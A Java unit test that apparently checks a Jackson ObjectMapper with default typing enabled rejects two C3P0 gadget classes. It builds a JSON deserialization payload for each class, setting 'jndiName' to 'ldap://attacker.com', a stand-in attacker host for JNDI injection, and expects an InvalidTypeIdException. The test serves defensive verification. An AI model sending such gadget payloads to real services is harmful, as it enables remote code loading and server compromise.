public void testBlockC3P0Gadgets() {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    String[] c3p0GadgetClasses = {
        "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
        "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    };
    
    for (String className : c3p0GadgetClasses) {
        String jsonPayload = String.format("{\"@class\":\"%s\",\"jndiName\":\"ldap://attacker.com\"}", className);
        try {
            mapper.readValue(jsonPayload, Object.class);
            fail("Security exception not thrown for " + className);
        } catch (JsonMappingException e) {
            assertTrue(e.getCause() instanceof InvalidTypeIdException);
        }
    }
}